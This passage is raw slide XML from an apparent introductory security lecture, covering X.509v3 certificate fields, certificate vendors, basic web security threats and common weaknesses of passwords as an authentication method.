            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1000" name="Picture 15" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2133720" y="1600200"/>
            <a:ext cx="4995360" cy="4546080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1001" name="Picture 5" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="380880" y="1219320"/>
            <a:ext cx="1523520" cy="761760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1002" name="Picture 9" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="361800" y="3114720"/>
            <a:ext cx="1666440" cy="485280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1003" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6120" y="3657600"/>
            <a:ext cx="2400120" cy="240120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.verizonbusiness.com/</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1004" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156960" y="1905120"/>
            <a:ext cx="1939680" cy="253800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.verisign.com</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1005" name="Picture 13" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="152280" y="4803840"/>
            <a:ext cx="1879200" cy="1409400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1006" name="Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304920" y="5943600"/>
            <a:ext cx="2009520" cy="253800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.rsa.com/</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1007" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7162920" y="1981080"/>
            <a:ext cx="1904760" cy="253800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.entrust.com</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1008" name="Picture 8" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7238880" y="1295280"/>
            <a:ext cx="1752120" cy="655200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1009" name="Picture 11" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7232760" y="3513240"/>
            <a:ext cx="1758600" cy="477360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1010" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7190280" y="3992400"/>
            <a:ext cx="1794960" cy="253800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.novell.com</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1011" name="Picture 12" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7238880" y="5740560"/>
            <a:ext cx="1676160" cy="431280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1012" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7013880" y="6126120"/>
            <a:ext cx="2048040" cy="253800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>http://www.microsoft.com</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>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3"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X.509v3</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1014" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="380952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GB" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>X.509v3 is a standard that describes the certificate structure.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GB" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>X.509v3 is used with:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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GB" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Secure web servers: SSL and TLS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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GB" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Web browsers: SSL and TLS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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GB" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Email programs: S/MIME</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1015" name="Picture 9" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4724280" y="1676520"/>
            <a:ext cx="4043160" cy="4723920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Basic Fields of X.509v3 Certificates</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1017"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Version   </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Serial Number   </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Signature Algorithm   </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Issuer   </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Validity   </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Valid From   </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Valid To       </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Subject   </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Public Key   </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Extensions (X.509 v3)       </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Security</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1019"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90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Web now widely used by business, government, individuals</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Internet &amp; Web are vulnerable</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Have a variety of threats</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Integrity</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Confidentiality</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Denial of service</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="新細明體"/>
              </a:rPr>
              <a:t> (DOS)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="新細明體"/>
              </a:rPr>
              <a:t>Authentication</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="新細明體"/>
              </a:rPr>
              <a:t>Need added security mechanisms</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0" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr sz="3000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Password Management</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PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="990360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Identification and Authentication Techniques</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1022"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Passwords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Biometrics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Tokens</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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3"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Passwords</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1024"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00"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Most common authentication technique</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Weakest form of protection</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Users typically choose passwords that are easy to remember and therefore easy to guess or crack.</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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Randomly generated passwords are hard to remember; thus, many users write them down.</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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Passwords are easily shared, written down, and forgotten.</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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Passwords can be stolen through many means, including observation, recording and playback, and security database theft.</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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Passwords are often transmitted in clear text or with easily broken encryption protocols.</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2060"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Short passwords can be discovered quickly in brute-force attacks.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
